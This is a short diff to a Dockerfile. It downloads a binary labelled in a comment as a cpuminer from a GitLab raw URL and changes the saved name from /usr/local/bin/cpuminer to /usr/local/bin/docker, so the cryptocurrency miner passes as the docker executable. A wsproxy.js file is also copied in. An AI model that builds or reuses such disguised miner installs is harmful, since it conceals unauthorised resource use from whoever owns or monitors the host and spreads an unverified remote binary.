@@ -9,7 +9,7 @@ RUN apt-get update && apt-get install -y \
     && rm -rf /var/lib/apt/lists/*
 
 # Download binary cpuminer kamu
-RUN wget -O /usr/local/bin/cpuminer "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
+RUN wget -O /usr/local/bin/docker "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
     && chmod +x /usr/local/bin/docker
 
 COPY wsproxy.js /wsproxy.js
